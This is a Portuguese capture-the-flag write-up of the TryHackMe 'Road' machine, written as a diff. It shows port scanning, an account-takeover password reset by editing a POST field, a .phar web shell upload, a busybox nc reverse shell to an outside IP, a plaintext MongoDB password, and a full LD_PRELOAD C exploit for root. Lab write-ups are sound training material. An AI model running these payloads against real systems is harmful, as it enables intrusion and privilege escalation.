@@ -1,0 +1,279 @@
+writeup Road Tryhackme!
+
+resultado rustscan: -> mais rapido então passo so as portas pro nmap ser mais rapido
+
+Open 10.66.180.143:22
+Open 10.66.180.143:80
+
+resultado nmap:
+
+sudo nmap -sV -sC -Pn -p22,80 10.66.180.143
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:e7:3b:b8:c6:74:8a:48:8e:54:1b:5a:1a:4f:5b:bc (RSA)
+|   256 e1:35:dd:53:d1:c0:b1:f3:ad:e0:6e:01:93:eb:a4:a8 (ECDSA)
+|_  256 e9:c8:a1:d6:7f:fe:f2:24:31:89:83:1b:f7:db:22:06 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Sky Couriers
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
+
+fuzzing de diretórios:
+
+v2/admin/               [Status: 200, Size: 32, Words: 5, Lines: 2, Duration: 149ms]
+v2/profileimages        [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 144ms]
+assets/                 [Status: 200, Size: 1506, Words: 100, Lines: 20, Duration: 158ms]
+v2/admin                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1355ms]
+phpMyAdmin/README       [Status: 200, Size: 1520, Words: 181, Lines: 53, Duration: 157ms]
+phpMyAdmin/sql/         [Status: 200, Size: 1699, Words: 102, Lines: 20, Duration: 145ms]
+phpMyAdmin/doc/         [Status: 200, Size: 959, Words: 64, Lines: 17, Duration: 146ms]
+phpMyAdmin/examples/    [Status: 200, Size: 1625, Words: 101, Lines: 20, Duration: 148ms]
+phpMyAdmin/libraries/   [Status: 200, Size: 3782, Words: 225, Lines: 30, Duration: 147ms]
+phpMyAdmin/themes/      [Status: 200, Size: 1557, Words: 99, Lines: 20, Duration: 153ms]
+phpMyAdmin/templates/   [Status: 200, Size: 10451, Words: 637, Lines: 63, Duration: 167ms]
+phpMyAdmin/tmp/         [Status: 200, Size: 959, Words: 64, Lines: 17, Duration: 148ms]
+phpMyAdmin/ChangeLog    [Status: 200, Size: 41123, Words: 6834, Lines: 566, Duration: 152ms]
+phpMyAdmin/             [Status: 200, Size: 19290, Words: 3109, Lines: 460, Duration: 593ms]
+phpMyAdmin/index.php    [Status: 200, Size: 19290, Words: 3109, Lines: 460, Duration: 595ms]
+phpMyAdmin/tmp/         [Status: 200, Size: 959, Words: 64, Lines: 17, Duration: 146ms]
+phpMyAdmin/composer.json [Status: 200, Size: 4106, Words: 1040, Lines: 123, Duration: 147ms]
+phpMyAdmin/vendor/      [Status: 200, Size: 3926, Words: 245, Lines: 32, Duration: 153ms]
+phpMyAdmin/libraries/   [Status: 200, Size: 3782, Words: 225, Lines: 30, Duration: 145ms]
+phpMyAdmin/tmp/         [Status: 200, Size: 959, Words: 64, Lines: 17, Duration: 148ms]
+phpMyAdmin/composer.lock [Status: 200, Size: 201246, Words: 84787, Lines: 5507, Duration: 148ms]
+assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 4391ms]
+v2/admin/login.html     [Status: 200, Size: 2619, Words: 422, Lines: 53, Duration: 4394ms]
+index.html              [Status: 200, Size: 19607, Words: 2975, Lines: 540, Duration: 155ms]
+assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 146ms]
+phpMyAdmin/             [Status: 200, Size: 19290, Words: 3109, Lines: 460, Duration: 161ms]
+
+
+explorei muita coisa do phpmyadmin e directory listing mas não me levou a lugar nenhum!
+então eu vi que poderia criar uma conta em: http://10.66.180.143/v2/admin/login.html na opção register
+
+fiz isso!
+
+meu username criado: hacker@gmail.com
+minha senha criada: hacker123
+
+entrando eu vi que o painel admin so me dava opções clicáveis em resetUser e upload de foto de perfil
+são 2 vetores exploráveis!
+
+primeiro: tentei resetar a senha do usuário administrador vendo que o email do mesmo estava no código
+fonte da página: admin@sky.thm
+
+utilizei o burp para identificar a requisição:
+
+requisição POST normal:
+
+POST /v2/lostpassword.php HTTP/1.1
+Host: 10.66.180.143
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.66.180.143/v2/ResetUser.php
+Content-Type: multipart/form-data; boundary=----geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Length: 630
+Origin: http://10.66.180.143
+Connection: keep-alive
+Cookie: PHPSESSID=dheeuaancqtvh467is719cl9gu; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="uname"
+
+hacker@gmail.com
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="npass"
+
+admin
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="cpass"
+
+admin
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="ci_csrf_token"
+
+
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="send"
+
+Submit
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f--
+
+
+requisição POST alterada:
+
+POST /v2/lostpassword.php HTTP/1.1
+Host: 10.66.180.143
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.66.180.143/v2/ResetUser.php
+Content-Type: multipart/form-data; boundary=----geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Length: 630
+Origin: http://10.66.180.143
+Connection: keep-alive
+Cookie: PHPSESSID=dheeuaancqtvh467is719cl9gu; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="uname"
+
+admin@sky.thm
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="npass"
+
+admin
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="cpass"
+
+admin
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="ci_csrf_token"
+
+
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f
+Content-Disposition: form-data; name="send"
+
+Submit
+------geckoformboundary5c6cf99cf4ea195359d024b2fccb675f--
+
+
+e o RESPONSEfoi:
+
+HTTP/1.1 200 OK
+Date: Tue, 07 Apr 2026 17:23:37 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+refresh: 3;url=ResetUser.php
+Content-Length: 37
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Password changed. 
+Taking you back...
+
+
+
+-> CONSEGUI LOGAR COMO ADMIN E A SENHA DELE AGORA É admin
+
+tentei realizar upload de shell no campo de upload de foto de usuário, troquei a extensão para .phar
+-> no responde tem a localização de onde o upload foi: /v2/profileimages/
+ http://10.66.180.143/v2/profileimages/
+
+
+REVERSE SHELL:
+
+http://10.66.180.143/v2/profileimages/index2.phar?cmd=busybox+nc+192.168.200.114+1337+-e+/bin/bash
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+ESTABILIZANDO A SHELL:
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+-> máquina não tem netstat e não tem como instalar,
+subi meu script que faz isso e mostra as portas abertas pra mim igual o netstat:
+
+portas abertas localmente:
+
+www-data@ip-10-66-180-143:/tmp$ python3 nt.py
+python3 nt.py
+[!] netstat não encontrado. Usando /proc...
+
+
+Proto	IP		Port	State		PID	Process
+--------------------------------------------------------------------------------
+TCP	0.0.0.0	22	LISTEN      	-	- 🔥
+TCP	127.0.0.53	53	LISTEN      	-	- 🔥
+TCP	127.0.0.1	9000	LISTEN      	-	- 
+TCP	127.0.0.1	3306	LISTEN      	-	- 🔥
+TCP	127.0.0.1	27017	LISTEN      	-	- 
+TCP	127.0.0.1	33060	LISTEN      	-	- 
+TCP	10.66.180.143	37590	ESTABLISHED 	-	- 
+TCP	10.66.180.143	34052	ESTABLISHED 	2461	python3 
+TCP	10.66.180.143	48380	ESTABLISHED 	-	- 
+UDP	127.0.0.53	53	CLOSE       	-	- 🔥
+UDP	10.66.180.143	68	CLOSE       	-	- 
+www-data@ip-10-66-180-143:/tmp$ 
+
+
+
+tentei ver o que estava na porta 9000 e era o mongodb!
+loguei nele e peguei a senha do usuário webdeveloper
+
+> show dbs
+shshow dbs
+admin   0.000GB
+backup  0.000GB
+config  0.000GB
+local   0.000GB
+
+> show collections
+shshow collections
+collection
+user
+
+> db.user.find()
+dbdb.user.find()
+{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
+{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
+{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
+{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
+{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
+> 
+
+
+username: webdeveloper
+password: BahamasChapp123!@#
+
+loguei pelo ssh do webdeveloper
+
+flag de usuario capturada!
+
+escalando privilégio pra root!
+
+webdeveloper@ip-10-66-180-143:~$ sudo -l
+Matching Defaults entries for webdeveloper on ip-10-66-180-143:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User webdeveloper may run the following commands on ip-10-66-180-143:
+    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+
+no sudo -l me mostrou isso: env_keep+=LD_PRELOAD -> isso mostra que o sudo está mal configurado e isso permite carregar bibliotecas externas e subir para root!
+
+exploit:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+
+
+PARA COMPILAR NA MAQUINA: gcc -fPIC -shared -o shell exploit_LD_PRELOAD.c -nostartfiles -w
+sudo LD_PRELOAD=/tmp/shell /usr/bin/sky_backup_utility
+virei root!
+
+flag de root capturada
